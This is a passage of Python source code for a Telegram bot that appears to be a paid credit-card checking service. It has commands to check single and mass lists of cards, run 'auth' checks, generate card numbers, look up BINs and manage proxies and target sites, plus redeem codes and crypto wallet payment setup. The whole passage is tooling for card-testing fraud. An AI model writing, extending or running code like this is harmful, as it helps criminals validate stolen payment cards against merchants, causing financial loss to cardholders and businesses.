    await edit_admin(cb, "\n".join(lines), admin_main_kb(cb.from_user.id))

@router.callback_query(F.data == "admin:force_list")
async def cb_force_list(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    set_awaiting(cb.from_user.id, "force_add")
    await cb.answer()
    channels = force_channels_list()
    lines = [f"{pe('unlock')} <b>Force Channels</b>\n<blockquote>"]
    for ch in channels: lines.append(f"{'✅' if ch['enabled'] else '❌'} <code>{esc(ch['chat_id'])}</code> · {esc(ch['title'][:30])}")
    if not channels: lines.append("None configured. Send @channel to add.")
    lines.append("</blockquote>")
    await edit_admin(cb, "\n".join(lines), back_kb())

@router.callback_query(F.data == "admin:proxy_mgr")
async def cb_proxy_mgr(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    await cb.answer()
    text = f"{pe('link')} <b>Proxy Settings</b>\n<blockquote>Per-user proxies are managed from the main menu.</blockquote>"
    await edit_admin(cb, text, admin_main_kb(cb.from_user.id))

@router.callback_query(F.data == "admin:trial_setup")
async def cb_trial_setup(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    await cb.answer()
    hours = get_setting("trial_hours", "3")
    text = f"{pe('star')} <b>Free Trial</b>\n<blockquote>Duration: <b>{hours} hours</b>\nTo change, edit <code>trial_hours</code> in settings.</blockquote>"
    await edit_admin(cb, text, admin_main_kb(cb.from_user.id))

@router.callback_query(F.data == "admin:wallet_setup")
async def cb_wallet_setup(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    set_awaiting(cb.from_user.id, "wallet_setup")
    await cb.answer()
    text = f"{pe('gem')} Send: <code>usdt <address></code> or <code>ton <address></code>"
    await edit_admin(cb, text, back_kb())

@router.callback_query()
async def cb_unknown(cb: CallbackQuery):
    await cb.answer("Unknown action", show_alert=False)

# ── AWAITING INPUT HANDLER (F2 — tool inputs + admin inputs) ────────────────
@router.message()
async def handle_awaiting(msg: Message, bot: Bot):
    uid = msg.from_user.id
    state = get_awaiting(uid)
    if not state:
        return
    text = (msg.text or "").strip()
    set_awaiting(uid, "")

    if state == "tool_bin":
        if not text.isdigit() or len(text) < 6:
            return await msg.answer(f"{pe('cross1')} Invalid BIN. Send 6+ digits.", parse_mode="HTML")
        st = await msg.answer(f"{pe('loading')} Searching BIN...", parse_mode="HTML")
        info = await lookup_bin(text[:6])
        if "error" in info: return await st.edit_text(f"{pe('cross1')} BIN not found.", parse_mode="HTML")
        bank = info.get("Issuer", "N/A"); country = (info.get("Country") or {}).get("Name", "N/A"); flag = country_flag((info.get("Country") or {}).get("Code", "")); ctype = str(info.get("Type", "N/A")).upper(); brand = str(info.get("Scheme", "N/A")).upper()
        await st.edit_text(f"{pe('gem')} <b>BIN Information</b>\n<blockquote>{pe('num1')} BIN: <code>{text[:6]}</code>\n{pe('shop')} Bank: {esc(bank)}\n{flag} Country: {esc(country)}\n{pe('diamond')} Type: {ctype}\n{pe('gem2')} Brand: {brand}</blockquote>", parse_mode="HTML")
    elif state == "tool_format":
        cc = normalize_cc(text)
        if not cc: return await msg.answer(f"{pe('cross1')} Invalid CC format.", parse_mode="HTML")
        await msg.answer(f"{pe('check')} Formatted:\n<blockquote><code>{cc}</code></blockquote>", parse_mode="HTML")
    elif state == "tool_addr":
        await cmd_addr(msg)
    elif state == "auth_input":
        cc = normalize_cc(text)
        if not cc: return await msg.answer(f"{pe('cross1')} Invalid CC format.", parse_mode="HTML")
        await process_check_logic(msg, cc, bot, mode="auth")
    elif state == "proxy_add":
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        normalized = [p for p in (normalize_proxy(l) for l in lines) if p]
        if not normalized: return await msg.answer(f"{pe('cross1')} No valid proxies.", parse_mode="HTML")
        st = await msg.answer(f"{pe('loading')} Adding {len(normalized)} proxies...", parse_mode="HTML")
        res = await add_proxies_bulk(uid, normalized)
        await st.edit_text(f"{pe('check')} <b>Proxies Added</b>\n<blockquote>{pe('online')} Live: <b>{res['live']}</b>\n{pe('cross2')} Dead: <b>{res['dead']}</b>\n{pe('add')} Added: <b>{res['added']}</b></blockquote>", parse_mode="HTML")
    elif state == "broadcast_msg":
        if not is_admin(uid): return
        st = await msg.answer(f"{pe('bell')} Broadcasting...", parse_mode="HTML")
        res = await broadcast_all(bot, text=text)
        await st.edit_text(f"{pe('check')} Done: {res['ok']} sent, {res['fail']} failed / {res['total']} total", parse_mode="HTML")
    elif state == "gen_code":
        parts = text.split()
        if len(parts) < 3: return await msg.answer(f"{pe('cross1')} Format: plan days max_uses", parse_mode="HTML")
        plan, days, uses = parts[0].lower(), int(parts[1]), int(parts[2])
        if plan not in PLANS: return await msg.answer(f"{pe('cross1')} Invalid plan.", parse_mode="HTML")
        code = "NOVAL-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
        with db() as c: c.execute("INSERT INTO redeem_codes(code, plan, max_uses, used, days) VALUES (?,?,?,0,?)", (code, plan, uses, days))
        await msg.answer(f"{pe('check')} Code: <code>{code}</code>\nPlan: {plan} · Days: {days} · Max uses: {uses}", parse_mode="HTML")
    elif state == "sites_add":
        if not is_full_admin(uid): return
        st = await msg.answer(f"{pe('loading')} Checking sites...", parse_mode="HTML")
        res = await bulk_add_sites(text)
        await st.edit_text(_bulk_sites_report(res), parse_mode="HTML")
    elif state == "force_add":
        if not is_full_admin(uid): return
        chat_id = text.strip()
        try:
            chat = await bot.get_chat(chat_id)
            add_force_channel(str(chat.id), chat.title or "", chat.type, chat.invite_link or "")
            await msg.answer(f"{pe('check')} Added {esc(chat.title or chat.id)}", parse_mode="HTML")
        except Exception as e:
            await msg.answer(f"{pe('cross1')} Failed: {esc(_sanitize_err(str(e)))}", parse_mode="HTML")
    elif state == "wallet_setup":
        if not is_full_admin(uid): return
        parts = text.split(maxsplit=1)
        if len(parts) != 2 or parts[0].lower() not in ("usdt", "ton"):
            return await msg.answer(f"{pe('cross1')} Format: usdt <address> or ton <address>", parse_mode="HTML")
        set_setting(f"wallet_{parts[0].lower()}", parts[1].strip())
        await msg.answer(f"{pe('check')} Wallet set: {parts[0].upper()}", parse_mode="HTML")
    elif state == "restore_upload":
        if msg.document:
            await _handle_backup_part(msg, uid)

# ── MAIN ────────────────────────────────────────────────────────────────────
async def main():
    global _bot_ref
    init_db(); load_extra_admins(); load_sites()
    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    _bot_ref = bot
    dp = Dispatcher()
    dp.message.middleware(EnsureUserMiddleware())
    dp.include_router(router)
    try:
        await bot.set_my_commands([
            BotCommand(command="start", description="Start"),
            BotCommand(command="sh", description="Check CC"),
            BotCommand(command="msh", description="Mass check"),
            BotCommand(command="auth", description="Auth check"),
            BotCommand(command="gen", description="CC gen"),
            BotCommand(command="bin", description="BIN lookup"),
            BotCommand(command="format", description="Format CC"),
            BotCommand(command="addr", description="Address gen"),
            BotCommand(command="chk", description="Test proxy"),
            BotCommand(command="redeem", description="Redeem code"),
            BotCommand(command="id", description="Chat info"),
        ])
    except: pass
    asyncio.create_task(auto_backup_task())
    log.info("Bot starting...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass
